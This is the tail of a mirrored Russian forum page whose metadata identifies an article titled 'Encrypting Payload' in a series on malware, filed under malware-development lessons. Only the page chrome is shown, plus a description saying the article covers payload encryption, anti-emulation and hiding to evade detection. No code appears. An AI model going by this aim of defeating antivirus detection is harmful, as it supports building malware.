+							<i class="fa--xf far fa-link "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#link"></use></svg></i>
+							<span>Ссылка</span>
+						</a>
+					
+				
+			</div>
+		</div>
+	
+
+								
+							</div>
+						
+						
+							<div class="block-body block-row block-row--separated">
+								
+																		
+										
+	
+
+	
+
+	<div class="shareInput" data-xf-init="share-input" data-success-text="">
+		
+			<label class="shareInput-label" for="_xfUid-2-1758965527">Копировать BB-код адреса статьи</label>
+		
+		<div class="inputGroup inputGroup--joined">
+			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
+				data-xf-init="tooltip" title="Скопировать в буфер обмена">
+
+				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
+			</div>
+			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[URL=&quot;https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/shifruyem-payload.10/&quot;]Шифруем Payload[/URL]" id="_xfUid-2-1758965527" />
+		</div>
+	</div>
+
+									
+									
+										
+	
+
+	
+
+	<div class="shareInput" data-xf-init="share-input" data-success-text="">
+		
+			<label class="shareInput-label" for="_xfUid-3-1758965527">Копировать BB-код статьи</label>
+		
+		<div class="inputGroup inputGroup--joined">
+			<div class="shareInput-button inputGroup-text js-shareButton is-hidden"
+				data-xf-init="tooltip" title="Скопировать в буфер обмена">
+
+				<i class="fa--xf far fa-copy "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#copy"></use></svg></i>
+			</div>
+			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[AMS=page, 10][/AMS]" id="_xfUid-3-1758965527" />
+		</div>
+	</div>
+
+																		
+								
+							</div>
+						
+					
+				</div>
+			</div>
+						
+						
+					</div>
+				
+			</div>
+
+			
+			
+	
+		<ul class="p-breadcrumbs p-breadcrumbs--bottom"
+			itemscope itemtype="https://schema.org/BreadcrumbList">
+			
+				
+
+				
+				
+
+				
+
+				
+				
+					
+					
+	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+		<a href="../../../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
+			<span itemprop="name">Уроки разработки вредоносного софта</span>
+		</a>
+		<meta itemprop="position" content="1" />
+	</li>
+
+				
+			
+		</ul>
+	
+
+			
+		</div>
+	</div>
+
+	<footer class="p-footer" id="footer">
+		<div class="p-footer-inner">
+
+			<div class="p-footer-row">
+				
+					<div class="p-footer-row-main">
+						<ul class="p-footer-linkList">
+							
+								
+								
+									<li>
+										
+											
+											
+												<a href="https://osint42.org/misc/style-variation" rel="nofollow"
+													class="js-styleVariationsLink"
+													data-xf-init="tooltip" title=" Выбор стиля"
+													data-xf-click="menu" data-z-index-ref=".u-bottomFixer" role="button" aria-expanded="false" aria-haspopup="true">
+
+													<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Выбор стиля</title><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+												</a>
+
+												<div class="menu" data-menu="menu" aria-hidden="true">
+													<div class="menu-content js-styleVariationsMenu">
+														
+
+	
+		
+
+	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965527%2C841cd65eb179abba5c913c9e5cd29e63"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="">
+
+		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>
+
+		
+			Системный
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965527%2C841cd65eb179abba5c913c9e5cd29e63"
+		class="menu-linkRow "
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="default">
+
+		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>
+
+		
+			Светлый
+		
+	</a>
+
+
+		
+
+	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965527%2C841cd65eb179abba5c913c9e5cd29e63"
+		class="menu-linkRow is-selected"
+		rel="nofollow"
+		data-xf-click="style-variation" data-variation="alternate">
+
+		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
+
+		
+			Тёмный
+		
+	</a>
+
+	
+
+	
+		
+	
+
+													</div>
+												</div>
+											
+										
+									</li>
+								
+								
+									<li><a href="../../../../misc/language.html" data-xf-click="overlay"
+										data-xf-init="tooltip" title="Выбор языка" rel="nofollow">
+										<i class="fa--xf far fa-globe "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#globe"></use></svg></i> Русский (RU)</a></li>
+								
+							
+						</ul>
+					</div>
+				
+				<div class="p-footer-row-opposite">
+					<ul class="p-footer-linkList">
+						
+
+						
+							<li><a href="../../../../threads/pravila-resursa.56/index.html">Условия и правила</a></li>
+						
+
+						
+							<li><a href="../../../../help/privacy-policy/index.html">Политика конфиденциальности</a></li>
+						
+
+						
+							<li><a href="../../../../help/index.html">Помощь</a></li>
+						
+
+						
+							<li><a href="../../../../forums/index.html">Главная</a></li>
+						
+
+						<li><a href="../../../../forums/-/index.rss" target="_blank" class="p-footer-rssLink" title="RSS"><span aria-hidden="true"><i class="fa--xf far fa-rss "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#rss"></use></svg></i><span class="u-srOnly">RSS</span></span></a></li>
+					</ul>
+				</div>
+			</div>
+
+			
+
+			
+		</div>
+	</footer>
+</div> <!-- closing p-pageWrapper -->
+
+<div class="u-bottomFixer js-bottomFixTarget">
+	
+	
+</div>
+
+<div class="u-navButtons js-navButtons">
+	<a href="javascript:" class="button button--scroll"><span class="button-text"><i class="fa--xf far fa-arrow-left "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-left"></use></svg></i><span class="u-srOnly">Назад</span></span></a>
+</div>
+
+
+	<div class="u-scrollButtons js-scrollButtons" data-trigger-type="both">
+		<a href="#top" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-up "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-up"></use></svg></i><span class="u-srOnly">Верх</span></span></a>
+		
+			<a href="#footer" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-down "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../../../data/local/icons/regulare419.svg?v=1757401797#arrow-down"></use></svg></i><span class="u-srOnly">Низ</span></span></a>
+		
+	</div>
+
+
+
+	<form style="display:none" hidden="hidden">
+		<input type="text" name="_xfClientLoadTime" value="" id="_xfClientLoadTime" title="_xfClientLoadTime" tabindex="-1" />
+	</form>
+
+	
+
+
+
+
+
+    
+    
+        
+        
+            <script type="application/ld+json">
+                {
+    "@context": "https://schema.org",
+    "@type": "CreativeWorkSeries",
+    "@id": "https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/shifruyem-payload.10/",
+    "name": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u0428\u0438\u0444\u0440\u0443\u0435\u043c Payload",
+    "headline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u0428\u0438\u0444\u0440\u0443\u0435\u043c Payload",
+    "alternativeHeadline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\" | \u0428\u0438\u0444\u0440\u0443\u0435\u043c Payload",
+    "description": "\u0412 \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u0439 \u0441\u0442\u0430\u0442\u044c\u0435 \u043c\u044b \u0440\u0430\u0441\u0441\u043c\u043e\u0442\u0440\u0435\u043b\u0438 \u0433\u0434\u0435 \u0445\u0440\u0430\u043d\u0438\u0442\u044c \u043f\u043e\u043b\u0435\u0437\u043d\u0443\u044e \u043d\u0430\u0433\u0440\u0443\u0437\u043a\u0443 (Payload), \u043d\u043e \u043a\u0430\u043a \u0431\u044b\u043b\u043e \u0441\u043a\u0430\u0437\u0430\u043d\u043e \u0432 \u043a\u043e\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0438 \u043a \u0441\u0442\u0430\u0442\u044c\u0435, \u0434\u043b\u044f \u043e\u0431\u0445\u043e\u0434\u0430 \u0434\u0435\u0442\u0435\u043a\u0442\u0430 \u043d\u0443\u0436\u043d\u043e \u043c\u043d\u043e\u0433\u043e \u0447\u0435\u0433\u043e \u0441\u0434\u0435\u043b\u0430\u0442\u044c, \u0432 \u0447\u0430\u0441\u0442\u043d\u043e\u0441\u0442\u0438 \u043d\u0443\u0436\u043d\u043e \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u0442\u044c Payload \u0438 \u0435\u0449\u0451 \u043f\u043e\u0437\u0430\u0431\u043e\u0442\u0438\u0442\u0441\u044f \u043e\u0431 \u0430\u043d\u0442\u0438\u044d\u043c\u0443\u043b\u044f\u0446\u0438\u0438 \u0438 \u0441\u043a\u0440\u044b\u0442\u0438\u044f...",
+    "dateCreated": "2025-05-09T06:54:51+00:00",
+    "dateModified": "2025-05-09T06:55:42+00:00",
+    "author": {
+        "@type": "Person",
+        "name": "0x42"
+    },
+    "thumbnailUrl": "https://osint42.org/data/attachments/0/72-6cf87db9b008bbe2adb3d041c3c85490.jpg?hash=az8LLJBF0x",
+    "interactionStatistic": {
+        "@type": "InteractionCounter",
+        "interactionType": "https://schema.org/LikeAction",
+        "userInteractionCount": "0"
+    }
+}
+            </script>
+        
+    
+
+
+
+	
+			
+	
+
+				
+			
+		
+		
+	
+
+</body>
+
+<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/page/shifruyem-payload.10/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:42:03 GMT -->
+</html>
+
+
+
+
+
+
+
+
+
